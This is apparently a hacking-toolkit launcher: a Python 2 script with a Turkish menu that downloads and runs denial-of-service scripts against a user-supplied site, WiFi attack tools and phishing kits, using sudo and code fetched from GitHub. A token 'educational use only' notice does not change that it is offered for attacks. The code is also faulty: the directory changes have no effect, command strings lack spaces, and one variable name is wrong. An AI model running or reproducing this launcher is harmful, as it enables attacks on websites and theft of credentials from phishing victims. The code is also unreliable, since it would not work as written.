#!/usr/bin/env python
import os
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet ALL IN ONE ")
print("""

1) ddos ve doslar
2) wifi attacks
3) yetkisizlendirme
4) phisher attackler
5) net scanleri
6) firewall sorgaliyicu
7) root kit kontrolcusu
LEGAL NOTICE
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY
IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY OR DAMAGE 
THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT
BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS

""")
islemno = raw_input("islem numarasi girin:")
if(islemno=="1"):
        os.system("git clone https://github.com/H1R0GH057/Anonymous.git")
        os.system("clear")
        os.system("cd Anonymous")
        print("""
        1)saphyra
        2)sadboy
        3)goldeneye
           """)
        dosislem = raw_input("islem no girin:")
        site = raw_input("site adi girin:")
        if(dosislem=="1"):
            os.system("python saphyra.py"+ site)
        elif(dosislem=="2"):
            os.system("python sadboy.py"+ site)
        elif(dosislem=="3"):
            os.system("python goldeneye.py"+ site)
elif(islemno=="2"):
         print("""
         1) wifite2
         2) wifite
         3) wireshark
         """)        
         wifiislem = raw_input("islem numarasi girin")
         if(wifiislem=="1"):
              os.system("git clone https://github.com/derv82/wifite2.git")
              os.system("clear")
              os.system("cd wifite2")
              os.system("sudo ./Wifite.py")    
         elif(wifiislem=="2"):
              os.system("sudo wifite")
         elif(wifiislem=="3"):
              os.system("sudo wireshark")
elif(islemno=="3"):
         print("bakimda")
elif(islemno=="4"):
      print("""
                     
      1) zphisher
      2) socialphish
                   
      """)       
      crish = raw_input("numara girin:")
      if(crish=="1"):
              os.system("git clone https://github.com/htr-tech/zphisher.git")
              os.system("clear")
              os.system("cd zphisher")
              os.system("sudo bash zphisher.sh")
      elif(crish=="2"):
              os.system("git clone https://github.com/xHak9x/SocialPhish.git")
              os.system("clear")
              os.system("cd SocialPhish")
              os.system("chmod +x socialphish.sh") 
              os.system("clear")
              os.system("./socialphish.sh")
elif(islemno=="5"):
              os.system("git clone https://github.com/themadbo1/nmapez")
              os.system("clear")
              os.system("cd nmapez")
              os.system("python nmapez.py")
elif(islemno=="6"):
              sate = raw_input("site adi:")
              os.system("wafw00f" + site)
elif(islemno=="7"):
              os.system("chkrootkit")          
              
              
             


                             
                                                      
                                  
                            
                          
                               
                     





















































































































